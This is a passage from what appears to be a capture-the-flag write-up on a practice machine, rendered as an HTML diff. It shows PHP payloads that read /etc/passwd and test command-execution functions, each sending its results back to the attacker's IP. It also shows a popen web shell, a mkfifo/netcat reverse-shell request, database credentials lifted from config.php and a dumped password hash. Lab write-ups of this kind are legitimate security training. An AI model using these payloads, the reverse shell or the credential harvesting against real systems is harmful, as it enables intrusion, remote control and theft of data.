+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Function to read a file and return its contents
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">read_file</span>($path) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_exists</span>($path) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_readable</span>($path)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">file_get_contents</span>($path);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Cannot read file: </span><span style="color:#e6db74">$path</span><span style="color:#e6db74"> (not found or not readable)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// List of interesting files to read
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $files_to_read <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;/etc/passwd&#39;</span>,
+</span></span><span style="display:flex;"><span>    ];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Read each file and add to output
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">foreach</span> ($files_to_read <span style="color:#66d9ef">as</span> $file) {
+</span></span><span style="display:flex;"><span>        $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">===== CONTENTS OF: </span><span style="color:#e6db74">$file</span><span style="color:#e6db74"> =====</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>        $output <span style="color:#f92672">.=</span> <span style="color:#a6e22e">read_file</span>($file);
+</span></span><span style="display:flex;"><span>        $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">===== END OF: </span><span style="color:#e6db74">$file</span><span style="color:#e6db74"> =====</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Send the output
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">fwrite</span>($sock, $output);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($sock);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Failed to connect to </span><span style="color:#e6db74">$ip</span><span style="color:#e6db74">:</span><span style="color:#e6db74">$port\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Which returns</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$nc -nlvp <span style="color:#ae81ff">8888</span>
+</span></span><span style="display:flex;"><span>listening on [any] 8888 ...
+</span></span><span style="display:flex;"><span>connect to [10.10.14.51] from (UNKNOWN) [10.10.11.241] 6556
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>===== CONTENTS OF: /etc/passwd =====
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>messagebus:x:100:106::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>pollinate:x:101:1::/var/cache/pollinate:/bin/false
+</span></span><span style="display:flex;"><span>sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>syslog:x:103:109::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uuidd:x:104:110::/run/uuidd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>tcpdump:x:105:111::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
+</span></span><span style="display:flex;"><span>landscape:x:107:113::/var/lib/landscape:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>fwupd-refresh:x:108:114:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash
+</span></span><span style="display:flex;"><span>lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+</span></span><span style="display:flex;"><span>mysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false
+</span></span></code></pre></div><p>So we know that there is a user <code>drwilliams</code> on the box. However, this is strange since the box is Windows. Is this web server running in a VM or container maybe? We try to read the private key, but don&rsquo;t get anything back. There are many ways to execute commands in PHP, so let&rsquo;s try a program that tries a bunch of them and see if any work</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.10.14.51&#39;</span>;
+</span></span><span style="display:flex;"><span>$port <span style="color:#f92672">=</span> <span style="color:#ae81ff">8888</span>;
+</span></span><span style="display:flex;"><span>$sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">fsockopen</span>($ip, $port);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($sock) {
+</span></span><span style="display:flex;"><span>    $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;COMMAND EXECUTION ATTEMPTS:</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Method 1: shell_exec
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;=== shell_exec ===</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;id&#34;</span>;
+</span></span><span style="display:flex;"><span>    $result <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">shell_exec</span>($cmd);
+</span></span><span style="display:flex;"><span>    $output <span style="color:#f92672">.=</span> $result <span style="color:#f92672">?:</span> <span style="color:#e6db74">&#34;Failed or disabled</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Method 2: exec
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">=== exec ===</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">@</span><span style="color:#a6e22e">exec</span>($cmd, $array_output, $return_val);
+</span></span><span style="display:flex;"><span>    $output <span style="color:#f92672">.=</span> <span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, $array_output) <span style="color:#f92672">?:</span> <span style="color:#e6db74">&#34;Failed or disabled</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Method 3: system
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">=== system ===</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ob_start</span>();
+</span></span><span style="display:flex;"><span>    $return_val <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">system</span>($cmd);
+</span></span><span style="display:flex;"><span>    $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">ob_get_contents</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ob_end_clean</span>();
+</span></span><span style="display:flex;"><span>    $output <span style="color:#f92672">.=</span> $result <span style="color:#f92672">?:</span> <span style="color:#e6db74">&#34;Failed or disabled</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Method 4: passthru
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">=== passthru ===</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ob_start</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">@</span><span style="color:#a6e22e">passthru</span>($cmd);
+</span></span><span style="display:flex;"><span>    $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">ob_get_contents</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ob_end_clean</span>();
+</span></span><span style="display:flex;"><span>    $output <span style="color:#f92672">.=</span> $result <span style="color:#f92672">?:</span> <span style="color:#e6db74">&#34;Failed or disabled</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Method 5: backtick operator
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">=== backtick operator ===</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $result <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#e6db74">`$cmd`</span>;
+</span></span><span style="display:flex;"><span>    $output <span style="color:#f92672">.=</span> $result <span style="color:#f92672">?:</span> <span style="color:#e6db74">&#34;Failed or disabled</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Method 6: proc_open
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">=== proc_open ===</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $descriptorspec <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">1</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">2</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>)
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    $process <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">proc_open</span>($cmd, $descriptorspec, $pipes);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_resource</span>($process)) {
+</span></span><span style="display:flex;"><span>        $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">stream_get_contents</span>($pipes[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">2</span>]);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">proc_close</span>($process);
+</span></span><span style="display:flex;"><span>        $output <span style="color:#f92672">.=</span> $result <span style="color:#f92672">?:</span> <span style="color:#e6db74">&#34;No output</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Failed or disabled</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Method 7: popen
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">=== popen ===</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $handle <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">popen</span>($cmd, <span style="color:#e6db74">&#39;r&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($handle) {
+</span></span><span style="display:flex;"><span>        $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($handle, <span style="color:#ae81ff">4096</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pclose</span>($handle);
+</span></span><span style="display:flex;"><span>        $output <span style="color:#f92672">.=</span> $result <span style="color:#f92672">?:</span> <span style="color:#e6db74">&#34;No output</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Failed or disabled</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Send the results
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">fwrite</span>($sock, $output);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($sock);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Failed to connect to </span><span style="color:#e6db74">$ip</span><span style="color:#e6db74">:</span><span style="color:#e6db74">$port\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>We get back:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$nc -nvlp <span style="color:#ae81ff">8888</span>
+</span></span><span style="display:flex;"><span>listening on [any] 8888 ...
+</span></span><span style="display:flex;"><span>connect to [10.10.14.51] from (UNKNOWN) [10.10.11.241] 6548
+</span></span><span style="display:flex;"><span>COMMAND EXECUTION ATTEMPTS:
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>=== shell_exec ===
+</span></span><span style="display:flex;"><span>Failed or disabled
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>=== exec ===
+</span></span><span style="display:flex;"><span>Failed or disabled
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>=== system ===
+</span></span><span style="display:flex;"><span>Failed or disabled
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>=== passthru ===
+</span></span><span style="display:flex;"><span>Failed or disabled
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>=== backtick operator ===
+</span></span><span style="display:flex;"><span>Failed or disabled
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>=== proc_open ===
+</span></span><span style="display:flex;"><span>Failed or disabled
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>=== popen ===
+</span></span><span style="display:flex;"><span>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></span></code></pre></div><p>Looks like <code>popen</code> works! We can download a simple <a href="https://github.com/lcatro/PHP-WebShell-Bypass-WAF/blob/master/php-shell-popen.php">popen web shell</a>, upload it, and we have a fully working web shell!
+<img src="/images/Hospital/webshell.png" alt="Webshell"></p>
+<p>Let&rsquo;s get a reverse shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /uploads/popen.phar?code=rm+-f+/tmp/f%3b+mkfifo+/tmp/f%3b+cat+/tmp/f+|+/bin/bash+-i+2&gt;%261+|+nc+10.10.14.51+9443+&gt;+/tmp/f <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.11.241:8080</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=ai6qsgr26pe0lnbum0fnhq77is</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
+</span></span></code></pre></div><p>And we get a call back</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$nc -nlvp <span style="color:#ae81ff">9443</span>
+</span></span><span style="display:flex;"><span>listening on [any] 9443 ...
+</span></span><span style="display:flex;"><span>connect to [10.10.14.51] from (UNKNOWN) [10.10.11.241] 6572
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group (979): Inappropriate ioctl for device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>www-data@webserver:/var/www/html/uploads$
+</span></span></code></pre></div><p>Immediately, we notice a <code>config.php</code> file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>www-data@webserver:/var/www/html$ ls
+</span></span><span style="display:flex;"><span>config.php  fonts      js          register.php  uploads
+</span></span><span style="display:flex;"><span>css         images     login.php   success.php   vendor
+</span></span><span style="display:flex;"><span>failed.php  index.php  logout.php  upload.php
+</span></span></code></pre></div><p>Inside are credentials to the MySQL database</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Database credentials. Assuming you are running MySQL
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">server with default setting (user &#39;root&#39; with no password) */</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DB_SERVER&#39;</span>, <span style="color:#e6db74">&#39;localhost&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DB_USERNAME&#39;</span>, <span style="color:#e6db74">&#39;root&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;my$qls3rv1c3!&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;hospital&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Attempt to connect to MySQL database */</span>
+</span></span><span style="display:flex;"><span>$link <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_connect</span>(<span style="color:#a6e22e">DB_SERVER</span>, <span style="color:#a6e22e">DB_USERNAME</span>, <span style="color:#a6e22e">DB_PASSWORD</span>, <span style="color:#a6e22e">DB_NAME</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Check connection
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>($link <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;ERROR: Could not connect. &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">mysqli_connect_error</span>());
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Let&rsquo;s check it out</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>www-data@webserver:/var/www/html$ mysql -u root -p
+</span></span><span style="display:flex;"><span>Enter password:
+</span></span><span style="display:flex;"><span>Welcome to the MariaDB monitor.  Commands end with ; or \g.
+</span></span><span style="display:flex;"><span>Your MariaDB connection id is 24
+</span></span><span style="display:flex;"><span>Server version: 10.11.2-MariaDB-1 Ubuntu 23.04
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>MariaDB [(none)]&gt; show databases;
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span>| Database           |
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span>| hospital           |
+</span></span><span style="display:flex;"><span>| information_schema |
+</span></span><span style="display:flex;"><span>| mysql              |
+</span></span><span style="display:flex;"><span>| performance_schema |
+</span></span><span style="display:flex;"><span>| sys                |
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span>5 rows in set (0.009 sec)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>MariaDB [(none)]&gt; use hospital
+</span></span><span style="display:flex;"><span>Reading table information for completion of table and column names
+</span></span><span style="display:flex;"><span>You can turn off this feature to get a quicker startup with -A
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Database changed
+</span></span><span style="display:flex;"><span>MariaDB [hospital]&gt; show tables;
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span>| Tables_in_hospital |
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span>| users              |
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span>1 row in set (0.001 sec)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>MariaDB [hospital]&gt; select * from users
+</span></span><span style="display:flex;"><span>    -&gt; ;
+</span></span><span style="display:flex;"><span>+----+----------+--------------------------------------------------------------+---------------------+
+</span></span><span style="display:flex;"><span>| id | username | password                                                     | created_at          |
+</span></span><span style="display:flex;"><span>+----+----------+--------------------------------------------------------------+---------------------+
+</span></span><span style="display:flex;"><span>|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
